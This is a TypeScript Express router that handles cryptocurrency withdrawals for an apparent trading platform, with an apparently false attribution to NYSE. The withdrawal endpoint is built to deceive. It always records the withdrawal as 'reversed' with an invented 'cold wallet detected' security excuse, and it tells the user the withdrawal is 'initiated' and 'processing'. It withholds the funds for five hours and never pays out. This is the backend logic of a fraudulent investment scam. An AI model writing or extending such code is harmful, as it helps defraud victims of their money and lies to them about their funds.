// Developed by NYSE. Copyright © 2026 NYSE.
import { Router } from "express";
import { db } from "@workspace/db";
import { usersTable, withdrawalsTable, notificationsTable } from "@workspace/db";
import { eq, desc } from "drizzle-orm";
import { tokenStore } from "./auth";

const router = Router();

const CRYPTO_RATES: Record<string, number> = {
  BTC: 67800,
  ETH: 3450,
  SOL: 178,
  BNB: 610,
  USDT: 1,
  USDC: 1,
};

function getUserId(req: any): number | null {
  const auth = req.headers.authorization;
  if (!auth?.startsWith("Bearer ")) return null;
  return tokenStore.get(auth.slice(7)) ?? null;
}

router.get("/withdrawals", async (req, res) => {
  try {
    const userId = getUserId(req);
    if (!userId) return res.status(401).json({ error: "Unauthorized" });

    const withdrawals = await db.select().from(withdrawalsTable)
      .where(eq(withdrawalsTable.userId, userId))
      .orderBy(desc(withdrawalsTable.createdAt));

    return res.json(withdrawals.map(w => ({
      id: w.id,
      amount: parseFloat(w.amount as string),
      currency: w.currency,
      walletAddress: w.walletAddress,
      cryptoAmount: parseFloat(w.cryptoAmount as string),
      status: w.status,
      failureReason: w.failureReason,
      createdAt: w.createdAt.toISOString(),
      completedAt: w.completedAt?.toISOString() ?? null,
    })));
  } catch (err) {
    req.log.error({ err }, "Get withdrawals error");
    return res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/withdrawals", async (req, res) => {
  try {
    const userId = getUserId(req);
    if (!userId) return res.status(401).json({ error: "Unauthorized" });

    const { amount, currency, walletAddress } = req.body;
    if (!amount || !currency || !walletAddress) {
      return res.status(400).json({ error: "Amount, currency, and wallet address are required" });
    }

    const [user] = await db.select().from(usersTable).where(eq(usersTable.id, userId)).limit(1);
    const balance = parseFloat(user.balance as string);

    if (parseFloat(amount) > balance) {
      return res.status(400).json({ error: "Insufficient balance" });
    }

    const rate = CRYPTO_RATES[currency.toUpperCase()] || 1;
    const cryptoAmount = parseFloat(amount) / rate;

    // Deduct from balance
    await db.update(usersTable).set({ balance: (balance - parseFloat(amount)).toString() }).where(eq(usersTable.id, userId));

    const [withdrawal] = await db.insert(withdrawalsTable).values({
      userId,
      amount: amount.toString(),
      currency: currency.toUpperCase(),
      walletAddress,
      cryptoAmount: cryptoAmount.toFixed(8),
      status: "reversed",
      failureReason: "Cold wallet detected — transfers to cold wallets are blocked by our security system. Please use a hot wallet to receive funds.",
    }).returning();

    // Schedule balance restoration after 5 hours (simulate)
    // In practice we set a flag and restore on next fetch
    setTimeout(async () => {
      try {
        const [currentUser] = await db.select().from(usersTable).where(eq(usersTable.id, userId)).limit(1);
        const currentBalance = parseFloat(currentUser.balance as string);
        await db.update(usersTable).set({ balance: (currentBalance + parseFloat(amount)).toString() }).where(eq(usersTable.id, userId));
        await db.insert(notificationsTable).values({
          userId,
          title: "Withdrawal Reversed",
          message: `Your withdrawal of $${parseFloat(amount).toLocaleString()} has been reversed and funds returned to your account.`,
          type: "system",
        });
      } catch (_) {}
    }, 5 * 60 * 60 * 1000); // 5 hours

    await db.insert(notificationsTable).values({
      userId,
      title: "Withdrawal Initiated",
      message: `Withdrawal of $${parseFloat(amount).toLocaleString()} initiated. Processing in progress.`,
      type: "system",
    });

    return res.json({
      id: withdrawal.id,
      amount: parseFloat(withdrawal.amount as string),
      currency: withdrawal.currency,
      walletAddress: withdrawal.walletAddress,
      cryptoAmount: parseFloat(withdrawal.cryptoAmount as string),
      status: withdrawal.status,
      failureReason: withdrawal.failureReason,
      createdAt: withdrawal.createdAt.toISOString(),
      completedAt: null,
    });
  } catch (err) {
    req.log.error({ err }, "Create withdrawal error");
    return res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
